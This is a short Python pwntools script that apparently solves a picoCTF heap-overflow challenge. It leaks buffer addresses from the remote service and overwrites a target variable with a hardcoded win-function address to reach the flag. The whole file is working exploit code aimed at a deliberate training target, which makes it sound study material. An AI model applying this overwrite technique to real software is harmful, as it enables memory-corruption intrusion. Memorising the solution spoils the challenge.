import pwn
import re

# 4011A0
win_address = b"\xa0\x11\x40\x00\x00\x00\x00\x00"

pwn.context.terminal = ['tmux', 'splitw', '-h']
p = pwn.remote("mimas.picoctf.net", 58971)

# p = pwn.process("chall")
# pwn.gdb.attach(p, '''
#     b check_win
#     continue
# ''')

p.recvuntil(b"Enter your choice:")

# Get input_data, x address
p.sendline(b"1")
resp = p.recvuntil(b"Enter your choice:").decode("utf-8")
hex_pattern = r'0x[0-9a-fA-F]+'
matches = re.findall(hex_pattern, resp)

in_address = int(matches[0], 16)
x_address = int(matches[1], 16)
print(f"in_address = 0x{in_address:x} x_address = 0x{x_address:x}")

# construct payload
distance = x_address - in_address
# payload = win_address
# if len(payload) < distance:
#     payload += b"c" * (distance - len(payload))
# payload += in_address.to_bytes(8, byteorder='little')
# payload += b"\n"

payload = b""
payload += b"c" * distance
payload += win_address
payload += b"\n"
print(f"payload = {payload}")

# write_buffer
p.sendline(b"2")
p.recvuntil(b"Data for buffer: ")
p.send(payload)
p.recvuntil(b"Enter your choice:")

# check_win
p.sendline(b"4")
print(p.recvall())

# p.interactive()